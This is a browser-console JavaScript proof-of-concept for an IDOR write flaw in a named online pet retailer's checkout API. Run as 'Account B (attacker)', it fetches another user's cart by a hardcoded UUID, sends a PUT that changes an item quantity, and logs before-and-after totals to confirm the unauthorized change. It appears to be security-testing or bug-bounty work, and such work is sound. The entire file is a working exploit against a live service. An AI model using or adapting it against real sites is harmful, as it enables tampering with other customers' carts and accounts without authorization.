// IDOR Write: Modify another user's cart
// Execute in browser console while logged in as Account B (attacker)

const CART_UUID = "6bd223b4-5040-4faa-ba85-6a85c1ec2d50"; // Account A's cart UUID

(async function () {
  console.log("[*] ========================================");
  console.log("[*] IDOR WRITE: Modifying Account A's Cart");
  console.log("[*] ========================================");

  // Step 1: Get cart BEFORE modification
  const cartBefore = await fetch(
    `https://www.zooplus.de/checkout/api/cart-api/v2/cart/${CART_UUID}`,
    {
      credentials: "include",
    }
  ).then((r) => r.json());

  const beforeCount = cartBefore.articles.length;
  const beforeTotal = cartBefore.summary.grandTotal;
  const articleId =
    cartBefore.articles.find((a) => a.id === 2966422)?.id ||
    cartBefore.articles[0]?.id;

  console.log(`[+] Cart BEFORE:`);
  console.log(`    Items: ${beforeCount}`);
  console.log(`    Total: ${beforeTotal} EUR`);
  console.log(`    Article ID to modify: ${articleId}`);

  // Step 2: Modify cart
  console.log(`\n[*] Modifying article ${articleId} quantity to 2...`);

  const response = await fetch(
    `https://www.zooplus.de/semiprotected/api/checkout/state-api/v2/set-article-quantity`,
    {
      method: "PUT",
      credentials: "include",
      headers: {
        "Content-Type": "application/json",
        Accept: "application/json",
      },
      body: JSON.stringify({
        articleId: articleId,
        quantity: 2,
      }),
    }
  );

  const responseText = await response.text();
  console.log(`[+] PUT Response: HTTP ${response.status}`);

  if (response.status === 200) {
    try {
      const json = JSON.parse(responseText);
      console.log(
        `[+] Response:`,
        JSON.stringify(json, null, 2).substring(0, 300)
      );
    } catch (e) {
      console.log(`[+] Response: ${responseText.substring(0, 300)}`);
    }
  }

  // Step 3: Wait for sync
  console.log(`\n[*] Waiting 3 seconds for sync...`);
  await new Promise((resolve) => setTimeout(resolve, 3000));

  // Step 4: Get cart AFTER modification
  const cartAfter = await fetch(
    `https://www.zooplus.de/checkout/api/cart-api/v2/cart/${CART_UUID}`,
    {
      credentials: "include",
    }
  ).then((r) => r.json());

  const afterCount = cartAfter.articles.length;
  const afterTotal = cartAfter.summary.grandTotal;

  console.log(`\n[+] Cart AFTER:`);
  console.log(`    Items: ${afterCount}`);
  console.log(`    Total: ${afterTotal} EUR`);

  // Step 5: Compare results
  console.log(`\n[*] ========================================`);
  console.log("[*] COMPARISON");
  console.log("[*] ========================================");
  console.log(`    Items: ${beforeCount} → ${afterCount}`);
  console.log(`    Total: ${beforeTotal} EUR → ${afterTotal} EUR`);

  if (afterCount !== beforeCount || Math.abs(afterTotal - beforeTotal) > 0.01) {
    console.log("\n[!!!] ========================================");
    console.log("[!!!] CRITICAL IDOR WRITE CONFIRMED!");
    console.log("[!!!] ========================================");
    console.log(`[!!!] Account B successfully modified Account A's cart!`);
    console.log(`[!!!] Before: ${beforeCount} items, ${beforeTotal} EUR`);
    console.log(`[!!!] After:  ${afterCount} items, ${afterTotal} EUR`);
    console.log(
      `[!!!] Endpoint: PUT /semiprotected/api/checkout/state-api/v2/set-article-quantity`
    );
    console.log(`[!!!] Payload: {"articleId": ${articleId}, "quantity": 2}`);
    return true;
  } else {
    console.log(
      "\n[!] Cart unchanged - modification may require different payload or endpoint"
    );
    return false;
  }
})();
